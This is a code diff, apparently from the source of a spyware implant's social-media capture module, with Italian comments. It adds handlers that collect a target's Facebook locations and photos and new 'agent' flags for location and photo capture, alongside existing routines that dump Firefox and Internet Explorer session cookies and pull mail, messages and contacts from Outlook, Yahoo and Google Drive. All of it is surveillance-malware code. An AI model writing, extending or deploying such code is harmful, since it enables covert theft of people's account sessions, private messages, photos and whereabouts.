@@ -25,6 +25,8 @@ extern DWORD HandleOutlookMail(char *); // Handle per Outlook Live
 extern DWORD YahooMessageHandler(char *); // Handler per Yahoo
 extern DWORD YahooContactHandler(char *); // Handler per Yahoo
 extern DWORD HandleGoogleDrive(char *);
+extern DWORD HandleFacebookPositions(char *); // Handler for Facebook positions
+extern DWORD HandleFacebookPhoto(char *); // Handler for Facebook photo
 
 extern int DumpFFCookies(void); // Cookie per Facebook
 extern int DumpIECookies(WCHAR *); // Cookie per IExplorer
@@ -37,6 +39,8 @@ extern DWORD social_process_control; // Variabile per il controllo del processo.
 extern BOOL bPM_IMStarted; // variabili per vedere se gli agenti interessati sono attivi
 extern BOOL bPM_MailCapStarted;
 extern BOOL bPM_ContactsStarted;
+extern BOOL bPM_LocationStarted;
+extern BOOL bPM_PhotosStarted;
 
 social_entry_struct social_entry[SOCIAL_ENTRY_COUNT];
 
@@ -228,9 +232,14 @@ void InitSocialEntries()
 	social_entry[6].RequestHandler = YahooMessageHandler;
 	wcscpy_s(social_entry[7].domain, YAHOO_DOMAIN);
 	social_entry[7].RequestHandler = YahooContactHandler;
-	wcscpy_s(social_entry[8].domain, GDRIVE_DOMAIN);
-	social_entry[8].RequestHandler = HandleGoogleDrive;
+	wcscpy_s(social_entry[8].domain, FACEBOOK_DOMAIN);
+	social_entry[8].RequestHandler = HandleFacebookPositions;
+	wcscpy_s(social_entry[9].domain, FACEBOOK_DOMAIN);
+	social_entry[9].RequestHandler = HandleFacebookPhoto;
+	wcscpy_s(social_entry[10].domain, GDRIVE_DOMAIN);	 // N.B.: this must be the last handler to be registered
+	social_entry[10].RequestHandler = HandleGoogleDrive; // 
 
+	
 	// Azzera i cookie in shared mem relativi a IExplorer
 	ZeroMemory(FACEBOOK_IE_COOKIE, sizeof(FACEBOOK_IE_COOKIE));
 	ZeroMemory(TWITTER_IE_COOKIE, sizeof(TWITTER_IE_COOKIE));
@@ -258,9 +267,11 @@ void SocialMainLoop()
 			CheckProcessStatus();
 		}
 
+
 		// Se tutti gli agenti sono fermi non catturo nemmeno i cookie
-		if (!bPM_IMStarted && !bPM_MailCapStarted && !bPM_ContactsStarted)
+		if (!bPM_IMStarted && !bPM_MailCapStarted && !bPM_ContactsStarted && !bPM_LocationStarted && !bPM_PhotosStarted)
 			continue;
+
 
 		// Verifica se qualcuno e' in attesa di nuovi cookies
 		// o se sta per fare una richiesta
